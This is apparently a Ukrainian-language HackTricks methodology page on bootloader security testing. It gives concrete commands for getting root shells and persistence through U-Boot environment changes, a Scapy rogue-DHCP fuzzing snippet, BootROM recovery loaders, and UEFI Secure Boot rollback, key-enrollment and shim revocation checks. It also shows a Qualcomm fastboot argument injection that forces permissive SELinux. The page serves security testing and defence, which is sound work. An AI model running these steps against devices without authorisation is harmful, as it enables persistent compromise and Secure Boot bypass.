# Тестування bootloader

{{#include ../../banners/hacktricks-training.md}}

Нижче наведено рекомендовані кроки для зміни конфігурацій запуску пристрою та тестування bootloader, таких як U-Boot і завантажувачі класу UEFI. Зосередьтеся на отриманні виконання коду на ранньому етапі, оцінюванні захисту підпису та відкату, а також на зловживанні шляхами відновлення або мережевого завантаження.

Пов’язане: обхід secure boot MediaTek за допомогою патчингу bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Швидкі прийоми для U-Boot і зловживання середовищем

1. Отримайте доступ до оболонки інтерпретатора
   - Під час завантаження натисніть відому клавішу переривання (часто будь-яку клавішу, 0, пробіл або спеціальну послідовність для конкретної плати) до виконання `bootcmd`, щоб перейти до запрошення U-Boot.<sup>[[1]](#references)</sup>

2. Перевірте стан завантаження та змінні
   - Корисні команди:
     - `printenv` (вивести середовище)
     - `bdinfo` (інформація про плату, адреси пам’яті)
     - `help bootm; help booti; help bootz` (підтримувані способи завантаження ядра)
     - `help ext4load; help fatload; help tftpboot` (доступні завантажувачі)

3. Змініть аргументи завантаження, щоб отримати root shell
   - Додайте `init=/bin/sh`, щоб ядро відкривало shell замість звичайного процесу init:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Мережеве завантаження з вашого TFTP-сервера
   - Налаштуйте мережу та отримайте образ ядра/fit із локальної мережі:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Зберегти зміни через середовище
   - Якщо сховище env не захищене від запису, можна зберегти контроль:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Перевірте змінні на кшталт `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, які впливають на резервні шляхи завантаження. Неправильно налаштовані значення можуть дозволити багаторазово перейти до shell.

6. Перевірте функції налагодження/небезпечні функції
   - Шукайте: `bootdelay` > 0, вимкнений `autoboot`, необмежену команду `usb start; fatload usb 0:1 ...`, можливість виконувати `loady`/`loads` через послідовний порт, імпорт `env import` із ненадійного носія та завантаження ядер/ramdisk без перевірки підпису.

7. Тестування образів/перевірки U-Boot
   - Якщо платформа заявляє про підтримку secure/verified boot з FIT-образами, спробуйте як непідписані, так і змінені образи:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Відсутність `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` або застаріла поведінка `verify=n` часто дає змогу завантажувати довільні payloads.
   - Не зупиняйтеся на простому результаті дозволу/заборони: нещодавнє дослідження FIT показало, що сам шлях перевірки може бути поверхнею атаки до автентифікації. Перевіряйте негативними тестами зовнішньо збережені дані FIT (`data-offset`, `data-position`, `data-size`), вибір підписаної конфігурації, обробку `loadables` і overlay / `extra-conf`.
   - Якщо у вас є відповідне дерево вихідного коду, `test/vboot/vboot_test.sh` — це швидкий спосіб відтворити поведінку перевірки FIT у U-Boot sandbox, перш ніж працювати зі справжнім обладнанням.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` і сценарії завантаження
   - У сучасних збірках U-Boot `bootcmd` часто є лише обгорткою навколо Standard Boot. Це означає, що носії з можливістю запису, PXE або SPI flash можуть стати справжньою межею довіри, навіть якщо видиме середовище здається нешкідливим.
   - `extlinux` bootmeth шукає `extlinux/extlinux.conf` у `/` та `/boot`; script bootmeth спочатку шукає `boot.scr.uimg`, а потім `boot.scr`. Під час мережевого завантаження ім’я сценарію може надходити з `boot_script_dhcp`.
   - Корисні команди для первинної перевірки:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Сценарії зловживання для тестування: контрольовані зловмисником USB/SD-носії, що стоять раніше в `boot_targets`, доступний для запису `/boot/extlinux/extlinux.conf`, шахрайський TFTP-сервер, що надає `boot.scr`, або виконання скрипта через SPI за допомогою `script_offset_f`.
   - Якщо платформа покладається на перевірку FIT, переконайтеся, що конфігурації підписані на рівні конфігурації, а не лише окремі образи; `required-mode=all` надійніше, ніж приймати будь-який один обов’язковий ключ.

## Поверхня мережевого завантаження (DHCP/PXE) і шахрайські сервери

9. Фаззинг параметрів PXE/DHCP
   - У застарілому коді обробки BOOTP/DHCP в U-Boot траплялися проблеми з безпекою пам’яті. Наприклад, CVE‑2024‑42040 описує розкриття пам’яті через спеціально сформовані відповіді DHCP, які можуть передавати байти з пам’яті U-Boot мережею.<sup>[[4]](#references)</sup> Перевірте шляхи виконання коду DHCP/PXE за допомогою надто довгих значень і значень на межі допустимого (назва завантажувального файла в опції 67, параметри постачальника, поля файла/імені сервера) та стежте за зависаннями/витоками.
   - Мінімальний фрагмент Scapy для перевірки параметрів завантаження під час мережевого завантаження:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Також перевірте, чи поля імен файлів PXE передаються до логіки shell/loader без санітизації, коли вони пов’язані зі скриптами підготовки ОС.

10. Тестування ін’єкції команд через rogue DHCP server
   - Налаштуйте rogue DHCP/PXE service і спробуйте ін’єктувати символи в поля імен файлів або параметрів, щоб дістатися до інтерпретаторів команд на наступних етапах ланцюжка завантаження. Добре підійдуть DHCP auxiliary у Metasploit, `dnsmasq` або власні скрипти Scapy. Спершу ізолюйте лабораторну мережу.

## Режими відновлення SoC ROM, які замінюють звичайне завантаження

Багато SoC мають режим BootROM «loader», який приймає код через USB/UART навіть за некоректних образів flash. Якщо secure-boot fuses не запрограмовані, це може забезпечити довільне виконання коду на дуже ранньому етапі ланцюжка завантаження.

- NXP i.MX (Serial Download Mode)
  - Інструменти: `uuu` (mfgtools3) або `imx-usb-loader`.
  - Приклад: `imx-usb-loader u-boot.imx` — передати власний U-Boot і запустити його з RAM.
- Allwinner (FEL)
  - Інструмент: `sunxi-fel`.
  - Приклад: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` або `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Інструмент: `rkdeveloptool`.
  - Приклад: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` — завантажити loader і передати власний U-Boot.

Перевірте, чи запрограмовані secure-boot eFuses/OTP на пристрої. Якщо ні, режими завантаження BootROM часто обходять усі перевірки на вищих рівнях (U-Boot, kernel, rootfs), безпосередньо виконуючи ваш payload першого етапу з SRAM/DRAM.

## Завантажувачі UEFI/класу ПК: швидкі перевірки

11. Тестування підміни ESP, відкату та додавання ключів
   - Підмонтуйте EFI System Partition (ESP) і перевірте наявність компонентів loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, шляхів до логотипів виробника.
   - За можливості зчитайте стан Secure Boot і бази даних ключів з ОС:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Якщо платформа перебуває в Setup Mode, приймає реєстрацію ключів без автентифікації або постачається з тестовим/стандартним Platform Key (клас PKfail), локальний адміністратор або фізичний зловмисник може зареєструвати власні KEK/db і залишити Secure Boot «увімкненим», завантажуючи довільні EFI-бінарні файли.<sup>[[3]](#references)</sup>
   - Спробуйте завантажитися з компонентами завантаження, підписаними ключами, термін дії яких було знижено, або з відомими вразливостями, якщо списки відкликань Secure Boot (dbx) не оновлені. Якщо платформа й досі довіряє старим shim/bootmanager, часто можна завантажити власне ядро або `grub.cfg` з ESP, щоб отримати persistence.
   - У Windows навіть на виправлених хостах можуть прийматися вразливі підписані boot manager, якщо підписувач `Microsoft Windows Production PCA 2011` відсутній у firmware `dbx`, як було виявлено у випадку BlackX.<sup>[[13]](#references)[[14]](#references)</sup> Обхід на кшталт Baton Drop може зареєструвати MOK зловмисника; під час наступних завантажень легітимний shim може завантажити EFI payload, підписаний цим ключем.<sup>[[12]](#references)[[13]](#references)</sup> Подальше відкликання старого підписувача Windows не видаляє зареєстрований MOK, тож шлях на основі shim може зберігатися, якщо цей shim і далі вважається довіреним.<sup>[[12]](#references)</sup>
   - Перш ніж тестувати цей шлях відкату на авторизованій UEFI-машині, перевірте **фактичний стан відкликань у прошивці**, а не лише історію оновлень Windows.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft надає цю команду PowerShell із підвищеними правами, яка лише зчитує дані, щоб перевірити наявність підписувача 2011 року в `dbx`:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` — це лише підказка: у лабораторії з можливістю відновлення перевірте конкретний підписаний компонент завантаження та інші відкликання.<sup>[[12]](#references)[[14]](#references)</sup> Очікуване оновлення реєстру або прострочений сертифікат підпису не є еквівалентом завершеного відкликання через `dbx`.<sup>[[13]](#references)[[14]](#references)</sup>

12. Тестування відкликання застарілих shim / SBAT / dbx
   - Старі shim, підписані Microsoft, і форки виробників усе ще можуть слугувати шляхом для bootkit на кшталт BYOVD, якщо відкликання застаріли. В ізольованій лабораторії розмістіть історично вразливий shim на ESP і спробуйте виконати chainload власного `grubx64.efi` або ядра.<sup>[[11]](#references)</sup>
   - Швидке первинне оцінювання:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Якщо shim усе ще запускається, хоча він є у списку відкликання, у firmware/OS застарілі оновлення `dbx` або система довіряє форкнутому loader, який не успадкував upstream-захисти SBAT.

13. Помилки розбору логотипу завантаження (клас LogoFAIL)
   - У firmware кількох OEM/IBV виявили вразливості до помилок розбору зображень у DXE, де обробляються логотипи завантаження. Якщо зловмисник може розмістити спеціально сформоване зображення в ESP за шляхом, специфічним для виробника (наприклад, `\EFI\<vendor>\logo\*.bmp`), і перезавантажити пристрій, може стати можливим виконання коду на ранньому етапі завантаження навіть із увімкненим Secure Boot. Перевірте, чи приймає платформа логотипи, надані користувачем, і чи доступні ці шляхи для запису з OS.<sup>[[2]](#references)</sup>


## Прогалини довіри в Android/Qualcomm ABL + GBL (Android 16)

На пристроях з Android 16, де Qualcomm ABL завантажує **Generic Bootloader Library (GBL)**, перевірте, чи ABL **автентифікує** UEFI app, яку завантажує з розділу `efisp`. Якщо ABL лише перевіряє **наявність** UEFI app і не перевіряє підписи, примітив запису в `efisp` дає змогу виконати **непідписаний код до запуску OS** під час завантаження.<sup>[[6]](#references)[[7]](#references)</sup>

Практичні перевірки та шляхи зловживання:

- **Примітив запису в efisp**: потрібен спосіб записати власну UEFI app у `efisp` (root/привілейована служба, помилка в OEM app, шлях через recovery/fastboot). Без цього прогалина в завантаженні GBL недоступна безпосередньо.<sup>[[6]](#references)</sup>
- **Ін’єкція аргументів fastboot OEM** (помилка ABL): деякі збірки приймають додаткові токени в `fastboot oem set-gpu-preemption` і додають їх до командного рядка ядра. Це можна використати, щоб примусово ввімкнути permissive SELinux і отримати змогу записувати в захищені розділи:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Якщо пристрій пропатчений, команда має відхиляти додаткові аргументи.<sup>[[5]](#references)[[6]](#references)</sup>
- **Розблокування bootloader через постійні прапорці**: payload на етапі завантаження може змінити постійні прапорці розблокування (наприклад, `is_unlocked=1`, `is_unlocked_critical=1`), імітуючи `fastboot oem unlock` без перевірок OEM-сервера/схвалення. Це забезпечує стійку зміну стану після наступного перезавантаження.<sup>[[6]](#references)</sup>

Захисні заходи та нотатки для тріажу:

- Перевірте, чи виконує ABL перевірку підпису payload GBL/UEFI з `efisp`. Якщо ні, вважайте `efisp` поверхнею з високим ризиком для персистентності.
- З’ясуйте, чи пропатчені обробники команд ABL fastboot OEM так, щоб **перевіряти кількість аргументів** і відхиляти додаткові токени.<sup>[[8]](#references)[[9]](#references)</sup>

## Застереження щодо апаратного забезпечення

Будьте обережні під час роботи з SPI/NAND flash на ранньому етапі завантаження (наприклад, заземлюючи контакти, щоб обійти читання), і завжди звіряйтеся з технічним описом flash-пам’яті. Коротке замикання в невдалий момент може пошкодити пристрій або програматор.

## Нотатки та додаткові поради

- Спробуйте `env export -t ${loadaddr}` і `env import -t ${loadaddr}`, щоб переміщувати блоки середовища між RAM і сховищем; деякі платформи дозволяють імпортувати env зі знімного носія без автентифікації.
- Для забезпечення персистентності в системах на базі Linux, які завантажуються через `extlinux.conf`, часто достатньо змінити рядок `APPEND` (додати `init=/bin/sh` або `rd.break`) у розділі завантаження, якщо перевірки підпису не виконуються.
- Якщо ціль використовує оновлення з двома слотами / A/B, перегляньте методики обходу anti-rollback і розсинхронізації слотів у [огляді аналізу прошивки](README.md), щоб не пропустити прогалини довіри, пов’язані лише з оновлювачем, поза межами самого bootloader.
- Якщо в userland доступні `fw_printenv/fw_setenv`, перевірте, чи відповідає `/etc/fw_env.config` фактичному сховищу env. Неправильно налаштовані зміщення дають змогу читати/записувати не той розділ MTD.

## References

- [1] [Методологія тестування безпеки прошивки](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Виявлення LogoFAIL: небезпека обробки зображень під час завантаження системи](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: недовірені ключі платформи підривають безпеку Secure Boot в екосистемі UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Деталі CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: розблокування Xiaomi за допомогою двох несанітизованих рядків](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Експлойт GBL для Qualcomm Snapdragon 8 Elite дає зловмисникам змогу розблокувати bootloader](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Архітектура Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: виправлення передачі недовірених даних у командний рядок ядра](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: додавання перевірки для команди set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Непридатний до завантаження: обхід перевірки підпису FIT в U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Примітка про вразливість VU#616257 — підписані Microsoft завантажувачі shim для UEFI уразливі до обходу Secure Boot](https://kb.cert.org/vuls/id/616257)
- [12] [UEFI-буткіт BlackLotus: міф підтверджено](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: UEFI-буткіт, схожий на BlackLotus](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Керування відкликаннями Windows Boot Manager для змін Secure Boot](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
{{#include ../../banners/hacktricks-training.md}}
